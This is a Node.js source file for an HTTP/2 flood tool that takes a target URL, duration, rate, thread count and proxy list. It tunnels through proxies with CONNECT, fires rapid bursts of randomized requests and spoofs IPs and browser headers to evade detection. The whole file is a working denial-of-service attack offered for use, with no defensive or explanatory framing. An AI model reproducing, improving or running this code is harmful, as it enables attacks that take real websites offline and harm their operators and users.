const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const fs = require('fs');
const os = require('os');

const errorHandler = error => {};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log('Usage: target time rate threads proxyfile');
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
}

function shuffleObject(obj) {
    const keys = Object.keys(obj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    const shuffledObject = {};
    for (const key of keys) {
        shuffledObject[key] = obj[key];
    }
    return shuffledObject;
}

const ipSpoof = () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
const spoofedIP = ipSpoof();

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "application/json, text/plain, */*;q=0.9,application/xml;q=0.8",
    "application/json;q=0.9,text/plain;q=0.8, */*;q=0.7",
    "application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
];

const langHeaders = [
    'en-US', 'en-GB', 'ko-KR', 'zh-CN', 'zh-TW', 'ja-JP', 'en-AU', 'en-CA',
    'fr-FR', 'de-DE', 'es-ES', 'it-IT', 'nl-NL', 'pt-BR', 'ru-RU'
];

const encodingHeaders = [
    '*', 'gzip', 'gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity', 'br'
];

const controlHeaders = [
    'max-age=604800', 'no-cache', 'no-store', 'public, max-age=0', 'private, max-age=0, no-store, no-cache, must-revalidate'
];

const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 70) + 50}.0.${Math.floor(Math.random() * 4000)}.${Math.floor(Math.random() * 100)} Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(Math.random() * 15)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 70) + 50}.0.${Math.floor(Math.random() * 4000)}.${Math.floor(Math.random() * 100)} Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/${Math.floor(Math.random() * 100)}.0.${Math.floor(Math.random() * 4000)}.${Math.floor(Math.random() * 100)}`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/${Math.floor(Math.random() * 100)}.0`,
    `Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 70) + 50}.0.${Math.floor(Math.random() * 4000)}.${Math.floor(Math.random() * 100)} Mobile Safari/537.36`,
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1",
    "Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36"
];

const additionalHeaders = [
    { "origin": `https://${parsedTarget.host}/` },
    { "x-requested-with": "XMLHttpRequest" },
    { "cache-control": "private" },
    { "accept-charset": "UTF-8" },
    { "geo-location": "UNKNOWN" },
    { "x-forwarded-for": spoofedIP },
    { "width": "1920" },
    { "dnt": "1" },
    { "sec-ch-ua": `"Google Chrome";v="${Math.floor(Math.random() * 100)}", "Chromium";v="${Math.floor(Math.random() * 100)}", "Not=A?Brand";v="${Math.floor(Math.random() * 100)}"` },
    { "sec-ch-ua-mobile": "?0" },
    { "sec-fetch-site": "same-origin" },
    { "sec-fetch-mode": "navigate" },
    { "sec-fetch-user": "?1" },
    { "sec-fetch-dest": "document" }
];

const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
    console.log(`by: taka 8/25/2026`);
    console.log('--------------------------------------------'.gray);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log(`[>] Restarting the script via ${RESTART_DELAY} ms...`);
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log(`[!] Maximum RAM usage percentage exceeded: ${ramPercentage.toFixed(2)} %`);
            restartScript();
        }
    };
    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 10); // Adjust interval timing as needed
}

class NetSocket {
    constructor() { }

    async HTTP(options, callback) {
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 10000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const path = parsedTarget.path.replace(/%RAND%/, generateRandomString(16));
const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const [host, port] = proxyAddr.split(":");

    const proxyOptions = {
        host,
        port: Number(port),
        address: `${parsedTarget.host}:443`,
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, async (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            rejectUnauthorized: false,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            socket: connection,
            ecdhCurve: "X25519:prime256v1",
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256",
            secureProtocol: "TLS_method",
            ALPNProtocols: ['h2'],
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https",
            settings: {
                headerTableSize: 8192,
                maxConcurrentStreams: 1000,
                initialWindowSize: 65535,
                maxHeaderListSize: 16384,
                maxFrameSize: 32768,
                enablePush: false,
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
        });

        client.on("connect", () => {
            setInterval(() => {
                const shuffledHeaders = shuffleObject({
                    ":method": randomElement(["GET", "POST", "HEAD"]),
                    ":authority": parsedTarget.host,
                    ":scheme": "https",
                    ":path": `${path}?${generateRandomString(5)}=${generateRandomString(8)}`,
                    "user-agent": randomElement(userAgents),
                    "accept": randomElement(acceptHeaders),
                    "accept-encoding": randomElement(encodingHeaders),
                    "accept-language": randomElement(langHeaders),
                    "cache-control": randomElement(controlHeaders),
                    ...randomElement(additionalHeaders),
                    "referer": `https://www.google.com/search?q=${generateRandomString(10)}`,
                });

                for (let i = 0; i < args.rate; i++) {
                    const request = client.request(shuffledHeaders);

                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });

                    request.end();
                }
            }, Math.floor(Math.random() * 10) + 10); // Random delay between 10ms to 20ms
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
        });
    });
}

setTimeout(() => process.exit(1), args.time * 1000);
